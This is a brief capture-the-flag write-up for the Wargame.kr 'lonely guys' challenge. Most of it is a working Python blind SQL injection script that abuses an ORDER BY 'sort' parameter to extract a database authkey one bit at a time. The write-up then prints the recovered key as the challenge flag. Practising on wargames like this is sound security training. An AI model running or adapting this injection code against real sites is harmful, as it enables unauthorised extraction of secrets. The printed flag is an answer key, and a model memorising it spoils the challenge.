# [Wargame.kr] lonely guys - Writeup

## Blind SQL Injection

``` python
import urllib.parse, urllib.request

def inject(a, b):
	url = 'http://wargame.kr:8080/lonely_guys/'
	post_data = {
		'sort':"asc, if(" \
			"mid(lpad(conv(ascii(mid((select authkey from authkey)," + str(a + 1) + ",1)),10,2),8,0)," + str(b + 1) + ",1)=0x31" \
			",1,(select 1 union select 2))"
	}
	headers = {
		'Content-Type':'application/x-www-form-urlencoded'
	}

	req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode('utf-8'), headers)
	res = urllib.request.urlopen(req).read().decode()
	res = res[res.find('<tbody>')+len('<tbody>'):res.find('</tbody>')].strip()

	return '1' if 'jacob' in res else '0'

def main():
	pw = ''
	for a in range(0, 40):
		temp = ''
		for b in range(0, 8):
			temp += inject(a, b)

		pw += chr(int(temp, 2))
		print('Password:', pw)

if __name__ == '__main__':
	main()
```
```
Password: af18fd25589d740e1eca8d9e4f19d23db308a28b
```

___

## Answer

flag: `af18fd25589d740e1eca8d9e4f19d23db308a28b`